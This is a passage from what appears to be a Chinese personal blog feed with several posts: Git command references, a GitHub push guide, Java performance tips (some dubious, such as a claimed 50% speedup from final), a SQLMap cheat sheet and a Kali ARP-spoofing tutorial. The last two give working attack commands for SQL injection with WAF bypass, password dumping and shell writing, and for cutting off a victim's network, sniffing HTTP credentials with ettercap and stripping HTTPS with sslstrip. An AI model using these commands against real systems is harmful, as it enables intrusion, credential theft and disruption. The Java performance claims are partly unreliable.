checkout - 建立追踪关系，在现有分支与指定的远程分支之间 $ git branch –set-upstream [branch] [remote-branch] 合并指定分支到当前分支 $ git merge [branch] 选择一个commit，合并进当前分支 $ git cherry-pick [commit] 删除分支 $ git branch -d [branch-name] 删除远程分支 $ git push origin –delete [branch-name]$ git branch -dr [remote/branch] 标签 列出所有tag $ git tag 新建一个tag在当前commit $ git tag [tag] 新建一个tag在指定commit $ git tag [tag] [commit] 删除本地tag $ git tag -d [tag] 删除远程tag $ git push origin :refs/tags/[tagName] 查看tag信息 $ git show [tag] 提交指定tag $ git push [remote] [tag] 提交所有tag $ git push [remote] –tags 新建一个分支，指向某个tag $ git checkout -b [branch] [tag] 查看信息显示有变更的文件 $ git status 显示当前分支的版本历史 $ git log 显示commit历史，以及每次commit发生变更的文件 $ git log –stat 搜索提交历史，根据关键词 $ git log -S [keyword] 显示某个commit之后的所有变动，每个commit占据一行 $ git log [tag] HEAD –pretty=format:%s 显示某个commit之后的所有变动，其”提交说明”必须符合搜索条件 $ git log [tag] HEAD –grep feature 显示某个文件的版本历史，包括文件改名 $ git log –follow [file]$ git whatchanged [file] 显示指定文件相关的每一次diff $ git log -p [file] 显示过去5次提交 $ git log -5 –pretty –oneline 显示所有提交过的用户，按提交次数排序 $ git shortlog -sn 显示指定文件是什么人在什么时间修改过 $ git blame [file] 显示暂存区和工作区的代码差异 $ git diff 显示暂存区和上一个commit的差异 $ git diff –cached [file] 显示工作区与当前分支最新commit之间的差异 $ git diff HEAD 显示两次提交之间的差异 $ git diff [first-branch]…[second-branch] 显示今天你写了多少行代码 $ git diff –shortstat “@{0 day ago}” 显示某次提交的元数据和内容变化 $ git show [commit] 显示某次提交发生变化的文件 $ git show –name-only [commit] 显示某次提交时，某个文件的内容 $ git show [commit]:[filename] 显示当前分支的最近几次提交 $ git reflog 从本地master拉取代码更新当前分支：branch 一般为master $ git rebase [branch] 同步下载远程仓库的所有变动 $ git fetch [remote] 显示所有远程仓库 $ git remote -v 显示某个远程仓库的信息 $ git remote show [remote] 增加一个新的远程仓库，并命名 $ git remote add [shortname] [url] 取回远程仓库的变化，并与本地分支合并 $ git pull [remote] [branch] 上传本地指定分支到远程仓库 $ git push [remote] [branch] 强行推送当前分支到远程仓库，即使有冲突 $ git push [remote] –force 推送所有分支到远程仓库 $ git push [remote] –all 恢复恢复暂存区的指定文件到工作区 $ git checkout [file] 恢复某个commit的指定文件到暂存区和工作区 $ git checkout [commit] [file] 恢复暂存区的所有文件到工作区 $ git checkout . 重置暂存区的指定文件，与上一次commit保持一致，但工作区不变 $ git reset [file] 重置暂存区与工作区，与上一次commit保持一致 $ git reset –hard 重置当前分支的指针为指定commit，同时重置暂存区，但工作区不变 $ git reset [commit] 重置当前分支的HEAD为指定commit，同时重置暂存区和工作区，与指定commit一致 $ git reset –hard [commit] 重置当前HEAD为指定commit，但保持暂存区和工作区不变 $ git reset –keep [commit] 新建一个commit，用来撤销指定commit后者的所有变化都将被前者抵消，并且应用到当前分支 $ git revert [commit] 暂时将未提交的变化移除，稍后再移入 $ git stash$ git stash pop 其他生成一个可供发布的压缩包 $ git archive]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>VersionContro</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用Git推送仓库到Github]]></title>
    <url>%2F2018%2F02%2F05%2F%E9%80%9A%E8%BF%87git%E5%91%BD%E4%BB%A4%E8%A1%8C%E3%80%82%2F</url>
    <content type="text"><![CDATA[刚开始试着想将自己的代码上传至github上的时候真的是个小白，Google上面到处搜到处找资源。后来云里雾里的成功上传后，发现网络上介绍的大致有两种方法，一种方法是通过git命令行，另一种方法是通过下载Github客户端或第三方工具，很多IDE也集成了git的大部分功能。 通过git命令行 ssh-keygen -t rsa -C “aunsetre@gmail.com“ //123 创建SSH Key 再去用户主目录里找到.ssh文件夹，里面有id_rsa和id_rsa.pub两个文件，这两个就是SSH Key的秘钥对，id_rsa是私钥，不能泄露，id_rsa.pub是公钥，可以公开。 去创建仓库 将仓库路径复制下来 git remote add origin git@github.com:flora0103/projects.git //关联一个远程库命令，git@github.com:flora0103/projects.git 这个是自己远程库git push -u origin master //关联后,第一次推送master分支的所有内容命令，此后，每次本地提交后，就可以使用命令git push origin master推送最新修改 初始化一个本地文件夹作为仓库 git init 仓库文件夹名称如我的就在命令行中输入:git projects 首先要将你想上传的代码文件夹拖至这个新出现的仓库文件夹，然后在命令行输入: cd 仓库文件夹名称 如我的就在命令行中输入: cd projects 这时你命令行中的目录就会出现在你的仓库目录下。 接下来输入: git add 你想上传的代码文件夹名称` 或者是输入: git add . (add后面的‘.’代表你仓库中的所有内容) 然后输入: git commit -m “你想交代的内容” 最后输入: git push origin master 一会儿后你就会在你github的仓库中看到你上传的代码文件夹啦。是不是都很简单呢！]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>Github</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java 代码性能优化总结]]></title>
    <url>%2F2018%2F01%2F29%2F2018-1-29-Java-%E4%BB%A3%E7%A0%81%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[代 码优化，一个很重要的课题。可能有些人觉得没用，一些细小的地方有什么好修改的，改与不改对于代码的运 行效率有什么影响呢？这个问题我是这么考虑的，就像 大海里面的鲸鱼一样，它吃一条小虾米有用吗？没用，但 是，吃的小虾米一多之后，鲸鱼就被喂饱了。代码优化也是一样，如果项目着眼于尽快无BUG上线，那么 此时可 以抓大放小，代码的细节可以不精打细磨；但是如果有足够的时间开发、维护代码，这时候就必须考虑每个可以优 化的细节了，一个一个细小的优化点累积起 来，对于代码的运行效率绝对是有提升的。 代码优化的目标是： 1、减小代码的体积 2、提高代码运行的效率 本文的内容有些来自网络，有些来自平时工作和学习，当然这不重要，重要的是这些代码优化的细节是否真真正正地有用。那本文会保持长期更新，只要有遇到值得分享的代码优化细节，就会不定时地更新此文。 代码优化细节 1、尽量指定类、方法的final修饰符 带 有final修饰符的类是不可派生的。在Java核心API中，有许多应用final的例子，例如java.lang.String，整个类 都是 final的。为类指定final修饰符可以让类不可以被继承，为方法指定final修饰符可以让方法不可以被重写。如 果指定了一个类为final，则该 类所有的方法都是final的。Java编译器会寻找机会内联所有的final方法，内联对于 提升Java运行效率作用重大，具体参见Java运行期优 化。此举能够使性能平均提高50%。 2、尽量重用对象 特别是String对象的使用，出现字符串连接时应该使用StringBuilder/StringBuffer代替。由于Java虚拟机不仅要花 时间生成对象，以后可能还需要花时间对这些对象进行垃圾回收和处理，因此，生成过多的对象将会给程序的性能 带来很大的影响。 3、尽可能使用局部变量 调用方法时传递的参数以及在调用中创建的临时变量都保存在栈中速度较快，其他变量，如静态变量、实例变量 等，都在堆中创建，速度较慢。另外，栈中创建的变量，随着方法的运行结束，这些内容就没了，不需要额外的垃 圾回收。 4、及时关闭流 Java编程过程中，进行数据库连接、I/O流操作时务必小心，在使用完毕后，及时关闭以释放资源。因为对这些大 对象的操作会造成系统大的开销，稍有不慎，将会导致严重的后果。 5、尽量减少对变量的重复计算 明确一个概念，对方法的调用，即使方法中只有一句语句，也是有消耗的，包括创建栈帧、调用方法时保护现 场、调用方法完毕时恢复现场等。所以例如下面的操作： for (int i = 0; i &lt; list.size(); i++) {…} 建议替换为： for (int i = 0, int length = list.size(); i &lt; length; i++) {…} 这样，在list.size()很大的时候，就减少了很多的消耗 6、尽量采用懒加载的策略，即在需要的时候才创建 例如： String str = “aaa”; if (i == 1) { list.add(str); } 建议替换为： if (i == 1) { String str = “aaa”; list.add(str); } 7、慎用异常 异 常对性能不利。抛出异常首先要创建一个新的对象，Throwable接口的构造函数调用名为fillInStackTrace()的本 地同步方 法，fillInStackTrace()方法检查堆栈，收集调用跟踪信息。只要有异常被抛出，Java虚拟机就必须调整调 用堆栈，因为在处理过程中创建 了一个新的对象。异常只能用于错误处理，不应该用来控制程序流程。 8、不要在循环中使用try…catch…，应该把其放在最外层 根据网友们提出的意见，这一点我认为值得商榷 9、如果能估计到待添加的内容长度，为底层以数组方式实现的集合、工具类指定初始长度 比如ArrayList、LinkedLlist、StringBuilder、StringBuffer、HashMap、 HashSet等等，以StringBuilder为例： （1）StringBuilder() // 默认分配16个字符的空间 （2）StringBuilder(int size) // 默认分配size个字符的空间 （3）StringBuilder(String str) // 默认分配16个字符+str.length()个字符空间 可 以通过类（这里指的不仅仅是上面的StringBuilder）的构造函数来设定它的初始化容量，这样可以明显地提升 性能。比如 StringBuilder吧，length表示当前的StringBuilder能保持的字符数量。因为当StringBuilder达到最大 容量的时 候，它会将自身容量增加到当前的2倍再加2，无论何时只要StringBuilder达到它的最大容量，它就不得 不创建一个新的字符数组然后将旧的字符数 组内容拷贝到新字符数组中—-这是十分耗费性能的一个操作。试想， 如果能预估到字符数组中大概要存放5000个字符而不指定长度，最接近5000的2 次幂是4096，每次扩容加的2不 管，那么： （1）在4096 的基础上，再申请8194个大小的字符数组，加起来相当于一次申请了12290个大小的字符数组，如果一开始能指定5000个大小的字符数组，就节省了一倍以上的空间 （2）把原来的4096个字符拷贝到新的的字符数组中去 这 样，既浪费内存空间又降低代码运行效率。所以，给底层以数组实现的集合、工具类设置一个合理的初始化容 量是错不了的，这会带来立竿见影的效果。但是，注 意，像HashMap这种是以数组+链表实现的集合，别把初始 大小和你估计的大小设置得一样，因为一个table上只连接一个对象的可能性几乎为0。初始 大小建议设置为2的N 次幂，如果能估计到有2000个元素，设置成new HashMap(128)、new HashMap(256)都可以。 10、当复制大量数据时，使用System.arraycopy()命令 11、乘法和除法使用移位操作 例如： for (val = 0; val &lt; 100000; val += 5) { a = val * 8; b = val / 2; } 用移位操作可以极大地提高性能，因为在计算机底层，对位的操作是最方便、最快的，因此建议修改为： for (val = 0; val &lt; 100000; val += 5) { a = val &lt;&lt; 3; b = val &gt;&gt; 1; } 移位操作虽然快，但是可能会使代码不太好理解，因此最好加上相应的注释。 12、循环内不要不断创建对象引用 例如： for (int i = 1; i &lt;= count; i++) { ​ Object obj = new Object(); } 这种做法会导致内存中有count份Object对象引用存在，count很大的话，就耗费内存了，建议为改为： Object obj = null; for (int i = 0; i &lt;= count; i++) { ​ obj = new Object(); } 这样的话，内存中只有一份Object对象引用，每次new Object()的时候，Object对象引用指向不同的Object罢 了，但是内存中只有一份，这样就大大节省了内存空间了。 13、基于效率和类型检查的考虑，应该尽可能使用array，无法确定数组大小时才使用ArrayList 14、尽量使用HashMap、ArrayList、StringBuilder，除非线程安全需要，否则不推荐使用Hashtable、 Vector、StringBuffer，后三者由于使用同步机制而导致了性能开销 15、不要将数组声明为public static final 因为这毫无意义，这样只是定义了引用为static final，数组的内容还是可以随意改变的，将数组声明为public更是 一个安全漏洞，这意味着这个数组可以被外部类所改变 16、尽量在合适的场合使用单例 使用单例可以减轻加载的负担、缩短加载的时间、提高加载的效率，但并不是所有地方都适用于单例，简单来 说，单例主要适用于以下三个方面： （1）控制资源的使用，通过线程同步来控制资源的并发访问 （2）控制实例的产生，以达到节约资源的目的 （3）控制数据的共享，在不建立直接关联的条件下，让多个不相关的进程或线程之间实现通信 17、尽量避免随意使用静态变量 要知道，当某个对象被定义为static的变量所引用，那么gc通常是不会回收这个对象所占有的堆内存的，如： public class A { ​ private static B b = new B(); } 此时静态变量b的生命周期与A类相同，如果A类不被卸载，那么引用B指向的B对象会常驻内存，直到程序终止 18、及时清除不再需要的会话 为 了清除不再活动的会话，许多应用服务器都有默认的会话超时时间，一般为30分钟。当应用服务器需要保存更 多的会话时，如果内存不足，那么操作系统会把部分 数据转移到磁盘，应用服务器也可能根据MRU（最近最频繁 使用）算法把部分不活跃的会话转储到磁盘，甚至可能抛出内存不足的异常。如果会话要被转储到磁 盘，那么必 须要先被序列化，在大规模集群中，对对象进行序列化的代价是很昂贵的。因此，当会话不再需要时，应当及时调 用HttpSession的 invalidate()方法清除会话。 19、实现RandomAccess接口的集合比如ArrayList，应当使用最普通的for循环而不是foreach循环来遍历 这 是JDK推荐给用户的。JDK API对于RandomAccess接口的解释是：实现RandomAccess接口用来表明其支持快 速随机访问，此接口的主要目的是允许一般的算法更改 其行为，从而将其应用到随机或连续访问列表时能提供良 好的性能。实际经验表明，实现RandomAccess接口的类实例，假如是随机访问的，使用普通 for循环效率将高于 使用foreach循环；反过来，如果是顺序访问的，则使用Iterator会效率更高。可以使用类似如下的代码作判断： if (list instanceof RandomAccess) { ​ for (int i = 0; i &lt; list.size(); i++){} } else { ​ Iterator&lt;?&gt; iterator = list.iterable(); ​ while (iterator.hasNext()){iterator.next()} } foreach循环的底层实现原理就是迭代器Iterator，参见Java语法糖1：可变长度参数以及foreach循环原理。所以 后半句”反过来，如果是顺序访问的，则使用Iterator会效率更高”的意思就是顺序访问的那些类实例，使用foreach 循环去遍历。 20、使用同步代码块替代同步方法 这点在多线程模块中的synchronized锁方法块一文中已经讲得很清楚了，除非能确定一整个方法都是需要进行同 步的，否则尽量使用同步代码块，避免对那些不需要进行同步的代码也进行了同步，影响了代码执行效率。 21、将常量声明为static final，并以大写命名 这样在编译期间就可以把这些内容放入常量池中，避免运行期间计算生成常量的值。另外，将常量的名字以大写 命名也可以方便区分出常量与变量 22、不要创建一些不使用的对象，不要导入一些不使用的类 这毫无意义，如果代码中出现”The value of the local variable i is not used”、”The import java.util is never used”，那么请删除这些无用的内容 23、程序运行过程中避免使用反射 关 于，请参见反射。反射是Java提供给用户一个很强大的功能，功能强大往往意味着效率不高。不建议在程序运 行过程中使用尤其是频繁使用反射机制，特别是 Method的invoke方法，如果确实有必要，一种建议性的做法是将 那些需要通过反射加载的类在项目启动的时候通过反射实例化出一个对象并放入内存 —-用户只关心和对端交互的 时候获取最快的响应速度，并不关心对端的项目启动花多久时间。 24、使用数据库连接池和线程池 这两个池都是用于重用对象的，前者可以避免频繁地打开和关闭连接，后者可以避免频繁地创建和销毁线程 25、使用带缓冲的输入输出流进行IO操作 带缓冲的输入输出流，即BufferedReader、BufferedWriter、BufferedInputStream、 BufferedOutputStream，这可以极大地提升IO效率 26、顺序插入和随机访问比较多的场景使用ArrayList，元素删除和中间插入比较多的场景使用LinkedList 这个，理解ArrayList和LinkedList的原理就知道了 27、不要让public方法中有太多的形参 public方法即对外提供的方法，如果给这些方法太多形参的话主要有两点坏处： 1、违反了面向对象的编程思想，Java讲求一切都是对象，太多的形参，和面向对象的编程思想并不契合 2、参数太多势必导致方法调用的出错概率增加 至于这个”太多”指的是多少个，3、4个吧。比如我们用JDBC写一个insertStudentInfo方法，有10个学生信息字段 要插如Student表中，可以把这10个参数封装在一个实体类中，作为insert方法的形参 28、字符串变量和字符串常量equals的时候将字符串常量写在前面 这是一个比较常见的小技巧了，如果有以下代码： String str = “123”; if (str.equals(“123”)) { ​ … } 建议修改为： String str = “123”; if (“123”.equals(str)) { ​ … } 这么做主要是可以避免空指针异常 29、请知道，在java中if (i == 1)和if (1 == i)是没有区别的，但从阅读习惯上讲，建议使用前者 平时有人问，”if (i == 1)”和”if (1== i)”有没有区别，这就要从C/C++讲起。 在C/C++中，”if (i == 1)”判断条件成立，是以0与非0为基准的，0表示false，非0表示true，如果有这么一段代码： int i = 2; if (i == 1) { ​ … } else { ​ … } C/C++判断”i==1”不成立，所以以0表示，即false。但是如果： int i = 2; if (i = 1) { ​ … } else { ​ … } 万 一程序员一个不小心，把”if (i == 1)”写成”if (i = 1)”，这样就有问题了。在if之内将i赋值为1，if判断里面的内容非0，返回的就是true了，但是明明i为2，比较的值是1，应该返回的 false。这种情况在C/C++的开发中是很可能发生的并且会导致一些难以理解的错误产生，所以，为了避免开发者在if语句中不正确的赋值操作，建议将 if语句写为： int i = 2; if (1 == i) { ​ … } else { ​ … } 这样，即使开发者不小心写成了”1 = i”，C/C++编译器也可以第一时间检查出来，因为我们可以对一个变量赋值i为 1，但是不能对一个常量赋值1为i。 但 是，在Java中，C/C++这种”if (i = 1)”的语法是不可能出现的，因为一旦写了这种语法，Java就会编译报错”Type mismatch: cannot convert from int to boolean”。但是，尽管Java的”if (i == 1)”和”if (1 == i)”在语义上没有任何 区别，但是从阅读习惯上讲，建议使用前者会更好些。 30、不要对数组使用toString()方法 看一下对数组使用toString()打印出来的是什么： public static void main(String[] args) { ​ int[] is = new int[]{1, 2, 3}; ​ System.out.println(is.toString()); } 结果是： [I@18a992f 本 意是想打印出数组内容，却有可能因为数组引用is为空而导致空指针异常。不过虽然对数组toString()没有意 义，但是对集合toString()是 可以打印出集合里面的内容的，因为集合的父类AbstractCollections重写了 Object的toString()方法。 32、不要对超出范围的基本数据类型做向下强制转型 这绝不会得到想要的结果： public static void main(String[] args) { ​ long l = 12345678901234L; ​ int i = (int)l; ​ System.out.println(i); } 我们可能期望得到其中的某几位，但是结果却是： 1942892530 解释一下。Java中long是8个字节64位的，所以12345678901234在计算机中的表示应该是： 0000 0000 0000 0000 0000 1011 0011 1010 0111 0011 1100 1110 0010 1111 1111 0010 一个int型数据是4个字节32位的，从低位取出上面这串二进制数据的前32位是： 0111 0011 1100 1110 0010 1111 1111 0010 这串二进制表示为十进制1942892530，所以就是我们上面的控制台上输出的内容。从这个例子上还能顺便得到两个结论： 1、 整型默认的数据类型是int，long l = 12345678901234L，这个数字已经超出了int的范围了，所以最后有一个 L，表示这是一个long型数。顺便，浮点型的默认类型是 double，所以定义float的时候要写成””float f = 3.5f” 2、接下来再写一句”int ii = l + i;”会报错，因为long + int是一个long，不能赋值给int 33、公用的集合类中不使用的数据一定要及时remove掉 如果一个集合类是公用的（也就是说不是方法里面的属性），那么这个集合里面的元素是不会自动释放的，因为 始终有引用指向它们。所以，如果公用集合里面的某些数据不使用而不去remove掉它们，那么将会造成这个公用 集合不断增大，使得系统有内存泄露的隐患。 34、把一个基本数据类型转为字符串，基本数据类型.toString()是最快的方式、String.valueOf(数据)次之、 数据+””最慢 把一个基本数据类型转为一般有三种方式，我有一个Integer型数据i，可以使用i.toString()、String.valueOf(i)、 i+””三种方式，三种方式的效率如何，看一个测试： public static void main(String[] args) { ​ int loopTime = 50000; ​ Integer i = 0; ​ long startTime = System.currentTimeMillis(); ​ for (int j = 0; j &lt; loopTime; j++) ​ { ​ String str = String.valueOf(i); ​ } ​ System.out.println(“String.valueOf()：” + (System.currentTimeMillis() - startTime) + “ms”); ​ startTime = System.currentTimeMillis(); ​ for (int j = 0; j &lt; loopTime; j++) ​ { ​ String str = i.toString(); ​ } ​ System.out.println(“Integer.toString()：” + (System.currentTimeMillis() - startTime) + “ms”); ​ startTime = System.currentTimeMillis(); ​ for (int j = 0; j &lt; loopTime; j++) ​ { ​ String str = i + “”; ​ } ​ System.out.println(“i + “”：” + (System.currentTimeMillis() - startTime) + “ms”); } 运行结果为： String.valueOf()：11ms Integer.toString()：5ms i + “”：25ms 所以以后遇到把一个基本数据类型转为String的时候，优先考虑使用toString()方法。至于为什么，很简单： 1、String.valueOf()方法底层调用了Integer.toString()方法，但是会在调用前做空判断 2、Integer.toString()方法就不说了，直接调用了 3、i + “”底层使用了StringBuilder实现，先用append方法拼接，再用toString()方法获取字符串 三者对比下来，明显是2最快、1次之、3最慢 35、使用最有效率的方式去遍历Map 遍历Map的方式有很多，通常场景下我们需要的是遍历Map中的Key和Value，那么推荐使用的、效率最高的方式是： public static void main(String[] args) { ​ HashMap&lt;String, String&gt; hm = new HashMap&lt;String, String&gt;(); ​ hm.put(“111”, “222”); ​ ​ Set&lt;Map.Entry&lt;String, String&gt;&gt; entrySet = hm.entrySet(); ​ Iterator&lt;Map.Entry&lt;String, String&gt;&gt; iter = entrySet.iterator(); ​ while (iter.hasNext()) ​ { ​ Map.Entry&lt;String, String&gt; entry = iter.next(); ​ System.out.println(entry.getKey() + “” + entry.getValue()); ​ } } 如果你只是想遍历一下这个Map的key值，那用”Set keySet = hm.keySet();”会比较合适一些 36、对资源的close()建议分开操作 意思是，比如我有这么一段代码： try { ​ XXX.close(); ​ YYY.close(); } catch (Exception e) { ​ … } 建议修改为： try { ​ XXX.close(); } catch (Exception e) { ​ … } try { ​ YYY.close(); } catch (Exception e) { ​ … } 虽 然有些麻烦，却能避免资源泄露。我们想，如果没有修改过的代码，万一XXX.close()抛异常了，那么就进入了catch块中 了，YYY.close()不会执行，YYY这块资源就不会回收了，一直占用着，这样的代码一多，是可能引起资源句柄泄露的。而改为下面的写法之后，就保 证了无论如何XXX和YYY都会被close掉 后记 优秀的代码来自每一点点小小的优化，关注每一个细节，不仅仅能提升程序运行效率，同样可以规避许多未知的问题。]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>性能优化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQLMap常用命令]]></title>
    <url>%2F2017%2F12%2F29%2F2017-9-29-SQLMap%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[cookie注入：sqlmap.py -u 注入点 --cookie &quot;参数&quot; --tables --level 2POST登录框注入：sqlmap.py -r 从文件读取数据 -p 指定的参数 --tables ​ sqlmap.py -u 登录的地址 --forms 自动判断注入 ​ sqlmap.py -u 登录的地址 --data &quot;指定参数&quot; 绕过waf防火墙：sqlmap.py -u 注入点 -v 3 --dbs --batch --tamper space2morehash.py,space2hash.py,base64encode.py,charencode.py-u #注入点 -g 谷歌搜索 -f#指纹判别数据库类型 -b #获取数据库版本信息 -p #指定可测试的参数(?page=1&amp;id=2 -p “page,id”) -D “” #指定数据库名 -T “” #指定表名 -C “” #指定字段 -s “” #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s “xx.log” 恢复:-s “xx.log” –resume) –columns#列出字段 –current-user #获取当前用户名称 –current-db #获取当前数据库名称 –users #列数据库所有用户 –passwords #数据库用户所有密码 –privileges #查看用户权限(–privileges -U root) -U #指定数据库用户 –dbs #列出所有数据库 –tables -D “” #列出指定数据库中的表 –columns -T “user” -D “mysql” #列出mysql数据库中的user表的所有字段 –dump-all #列出所有数据库所有表 –exclude-sysdbs #只列出用户自己新建的数据库和表 –dump -T “” -D “” -C “” #列出指定数据库的表的字段的数据(–dump -T users -D master -C surname) –dump -T “” -D “” –start 2 –top 4 # 列出指定数据库的表的2-4字段的数据 –dbms #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) –os #指定系统(Linux,Windows) --sql -shell 写shell --delay 延迟的时间]]></content>
      <tags>
        <tag>SQLMap</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Kail ARP 断网攻击（局域网内）]]></title>
    <url>%2F2017%2F12%2F05%2FKail-ARP-%E6%96%AD%E7%BD%91%E6%94%BB%E5%87%BB%EF%BC%88%E5%B1%80%E5%9F%9F%E7%BD%91%E5%86%85%EF%BC%89%2F</url>
    <content type="text"><![CDATA[首先 打开KALI 终端 输入指令：ifconfig 查看网卡设备 获取受害者电脑IP以及网关（同一局域网，网关相同），可以在Windows中ping 一下 ip看一下是否能ping通， 输入指令：arpspoof -i eth0（本机网卡设备名称）-t 192.168.0.114（受害者IP）192.168.0.1（目标网关） ，按下Enter 攻击开始 在Windows中打开CMD 输入指令 ping 192.168.0.114 （受害者IP）系统返回：请求超时！，即攻击成功， 按下Ctrl +C即可停止攻击 如果不知道局域网下有多少主机存活可以在终端输入指令fping -asg 192.168.0.100/24 查看局域网中存活的主机 ps:如果出现arpspoof: couldn’t arp for host ，要把虚拟机设 置成桥接，或者关闭目标防火墙。 echo 1 &gt;/proc/sys/net/ipv4/ip_forward 用于arp欺骗： arpspoof -i eth0(网卡) -t 192.168.1.100(目标ip) 192.168.1.1（网关） 用于arp欺骗后劫持图片 driftnot -i eth0(网卡) 劫持http账号密码 ettercap -Tq -i eth0(网卡) 如果想劫持https的 那就现将https的连接还原为http sslstrip -a -f -k 用这个命令 再与劫持http的命令结合使用]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>安全</tag>
        <tag>Kail</tag>
      </tags>
  </entry>
</search>
